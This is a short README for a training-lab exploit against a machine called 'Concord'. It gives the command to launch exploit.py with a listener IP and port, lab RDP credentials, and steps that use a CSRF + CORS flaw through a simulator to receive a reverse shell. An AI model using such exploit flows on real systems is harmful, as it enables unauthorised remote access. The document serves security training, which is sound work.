# Concord
> [!WARNING]
> This exploit only works for the CSRF + CORS scenario.


To run the exploit follow this steps.
1. Run the exploit
```bash
python3 exploit.py -l 192.168.45.243 -p 4444
```
> [!NOTE]
> Note that no target is needed, as you will need to use the provided "simulator" in the lab.

![Concord step 1](/.images/concord_1.png)

2. Then you will need to access via rdp to the concord machine
```bash
xfreerdp3 /u:student /p:studentlab /v:concord
```

3. Once logged in, click the "simulator" app in the desktop, and insert the prompted URL there.

![Concord simulator](/.images/concord_sim.png)

4. Finally, you will received a reverse shell.

![Concord step 2](/.images/concord_2.png)
